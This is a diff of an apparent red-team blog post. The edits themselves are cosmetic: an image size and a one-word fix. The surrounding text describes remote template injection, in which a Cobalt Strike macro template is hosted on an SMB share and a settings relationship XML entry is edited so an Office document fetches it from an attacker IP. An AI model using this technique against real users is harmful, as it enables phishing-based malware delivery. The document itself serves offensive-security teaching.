@@ -8,7 +8,7 @@ categories: [Red Team]
 <style>
 img {
   width: 85%;
-  height: 85%;
+  height: 80%;
 }
 </style>
 
@@ -102,7 +102,7 @@ Paste the Cobalt Strike macro into here and going to "File" -> "Save <file_name>
 </p>
 
 ## Editing settings .xml to point to a SMB share and executing the document
-Within the initial malicious template file created, another Office document needs to be created. This Office document needs to be a template file as well but does not need any macros within it. Within the Office document created in this post, "text" was simply written in the document. To access `settings.xml.res`, the Office document that was just created needs to be extracted (with a tool like 7-Zip). After extracting the Office document and going to `word/_rels/settings.xml.res`, the following was stuck into the `settings.xml.res` file:
+Within the initial malicious template file created, another Office document needs to be created. This Office document needs to be a template file as well but does not need any macros within it. Within the Office document created in this post, "test" was simply written in the document. To access `settings.xml.res`, the Office document that was just created needs to be extracted (with a tool like 7-Zip). After extracting the Office document and going to `word/_rels/settings.xml.res`, the following was stuck into the `settings.xml.res` file:
 ```xml
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\192.168.110.134\share\fax.dotm" TargetMode="External"/></Relationships>
